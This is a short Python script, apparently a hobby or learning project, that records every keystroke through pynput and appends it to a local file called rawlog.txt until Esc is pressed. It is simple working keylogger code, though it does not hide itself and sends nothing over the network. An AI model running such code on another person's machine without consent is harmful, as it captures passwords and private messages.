"""importing the pynput libary and functions required for this project"""
import pynput
from pynput.keyboard import Key, Listener

"""Initialising the "count" variable and the "keys" list"""
count = 0
keys = []

"""Function definition that is called when a key is pressed.
when keys are pressed they are added to the "keys" list,
after 10 keys are pressed it will write the data to the .txt file"""
def key_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0}".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

"""Function definition that is called for writing the key presses
to the .txt file. """
def write_file(keys):
    with open ("rawlog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)

"""Function definition that is called when a key is released,
checks if the key is the "ESC" key, if so it exits the application"""
def key_release(key):
    if key == Key.esc:
        write_file(keys)
        return False

"""Starts the listener function from pynput to read keystrokes"""
with Listener(on_press = key_press, on_release = key_release) as listener:
    listener.join()